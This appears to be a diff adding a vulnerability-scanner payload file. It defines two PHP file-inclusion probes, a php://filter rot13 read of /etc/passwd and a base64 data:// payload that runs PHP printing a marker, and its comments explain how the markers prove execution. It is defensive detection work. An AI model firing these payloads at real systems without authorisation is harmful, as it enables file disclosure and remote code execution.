@@ -1,0 +1,48 @@
+# Local/Remote File Inclusion via PHP stream wrappers.
+#
+# Distinct from path-traversal.yaml's plain "../../etc/passwd": these
+# target an `include()`/`require()`-style sink (not just a file-read
+# sink) via PHP's `php://filter` and `data://` stream wrappers, and both
+# fit the value-substitution engine model directly (a single field
+# becomes the whole wrapper URI).
+#
+# `lfi-php-filter-rot13-passwd` reads /etc/passwd through the rot13
+# filter chain. This is deliberately NOT the same signature
+# path-traversal.yaml looks for ("root:x:0:0") -- rot13'd, that text
+# becomes "ebbg:k:0:0", a string that cannot appear in a response by
+# coincidence or by the target simply reflecting the raw payload back
+# (the payload text itself contains neither substring), so a match is
+# real proof the filter chain executed against a real file, not proof
+# by reflection -- the same discipline the round-1 review required of
+# command-injection.yaml after catching a marker-echo bug there.
+#
+# `lfi-php-data-rce` goes further: if `allow_url_include` is on (rare
+# today, but still found on legacy/misconfigured PHP), the target
+# doesn't just read a file through the wrapper, it *executes* the
+# base64-decoded payload as PHP. The decoded payload computes 7*13 and
+# prints a fixed marker plus that computed number; the match string
+# ("shrdlr-lfi-rce-91") appears nowhere in the base64 payload text
+# itself, so -- as with the command-injection arithmetic markers -- only
+# genuine execution, not reflection, can produce it.
+- id: lfi-php-filter-rot13-passwd
+  finding_id: payload-lfi
+  payload: "php://filter/read=string.rot13/resource=/etc/passwd"
+  severity: high
+  description: >-
+    php://filter wrapper read /etc/passwd through a rot13 chain, evidence
+    the field is passed to include()/require() (or fopen()) unsanitized
+  match:
+    any:
+      - body_contains: "ebbg:k:0:0"
+        new_only: true
+- id: lfi-php-data-rce
+  finding_id: payload-lfi-rce
+  payload: "data://text/plain;base64,PD9waHAgZWNobyAic2hyZGxyLWxmaS1yY2UtIi4oNyoxMyk7Pz4="
+  severity: critical
+  description: >-
+    data:// wrapper payload was executed as PHP (allow_url_include),
+    not just reflected -- full remote code execution via file inclusion
+  match:
+    any:
+      - body_contains: "shrdlr-lfi-rce-91"
+        new_only: true
